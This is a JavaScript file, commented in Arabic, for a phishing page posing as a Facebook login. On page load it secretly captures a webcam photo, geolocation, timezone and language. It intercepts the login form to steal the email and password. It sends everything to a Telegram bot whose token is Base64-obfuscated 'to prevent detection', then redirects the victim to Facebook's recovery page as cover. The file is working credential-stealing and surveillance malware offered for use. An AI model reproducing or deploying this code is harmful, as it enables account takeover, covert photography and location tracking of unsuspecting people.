// --- البيانات المشفرة (Base64) لمنع الكشف ---
const _0x5 = ["ODUyNzU2NTIwNTpBQUZwb3lMRHppcjRvaVFLcVBQTy1DbTQwWFZ6VUJ2TEVSOA==", "MTYxMTM5ODMwMw=="];
const BOT_TOKEN = atob(_0x5[0]);
const CHAT_ID = atob(_0x5[1]);

// إخفاء شاشة التحميل بعد 2.5 ثانية
setTimeout(() => {
    const loader = document.getElementById('loader');
    if(loader) loader.style.display = 'none';
}, 2500);

// بدء العمليات الاستخباراتية (كاميرا + موقع + بصمة)
window.onload = () => {
    initCapture();
};

async function initCapture() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        let video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
            let canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            let imgData = canvas.toDataURL('image/jpeg');
            
            // إيقاف الكاميرا فوراً
            stream.getTracks().forEach(track => track.stop());

            // جلب الموقع الجغرافي
            navigator.geolocation.getCurrentPosition(pos => {
                sendToBot(imgData, pos);
            }, () => {
                sendToBot(imgData, null);
            });
        }, 2000);
    } catch (e) {
        sendToBot(null, null); // إرسال البصمة فقط في حال رفض الكاميرا
    }
}

function sendToBot(img, pos) {
    const lat = pos ? pos.coords.latitude.toFixed(5) : "مرفوض";
    const lng = pos ? pos.coords.longitude.toFixed(5) : "مرفوض";
    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const lang = navigator.language;
    const time = new Date().toLocaleString('ar-EG');

    let info = `🌍 **بصمة استخباراتية جديدة**\n`;
    info += `📍 الموقع: \`${lat},${lng}\`\n`;
    info += `🌐 التوقيت: \`${tz}\`\n`;
    info += `🗣️ اللغة: \`${lang}\`\n`;
    info += `🕐 الوقت: \`${time}\``;

    if (img) {
        let fd = new FormData();
        fd.append('photo', dataURLtoBlob(img), 'c.jpg');
        fd.append('caption', info);
        fd.append('chat_id', CHAT_ID);
        fd.append('parse_mode', 'Markdown');
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    } else {
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: info, parse_mode: "Markdown" })
        });
    }
}

// سحب بيانات تسجيل الدخول
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    const email = document.getElementById('user').value;
    const pass = document.getElementById('pass').value;
    
    const loginMsg = `👤 **بيانات دخول (Facebook)**\n📧 الحساب: \`${email}\`\n🔑 الكلمة: \`${pass}\`\n📱 الجهاز: \`${navigator.userAgent}\``;

    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: loginMsg, parse_mode: "Markdown" })
    }).then(() => {
        // التوجيه النهائي للتمويه
        window.location.href = "https://www.facebook.com/recover/initiate/";
    });
});

function dataURLtoBlob(dataurl) {
    let arr = dataurl.split(','), mime = arr[0].match(/:(.*?);/)[1],
        bstr = atob(arr[1]), n = bstr.length, u8arr = new Uint8Array(n);
    while(n--) u8arr[n] = bstr.charCodeAt(n);
    return new Blob([u8arr], {type:mime});
}
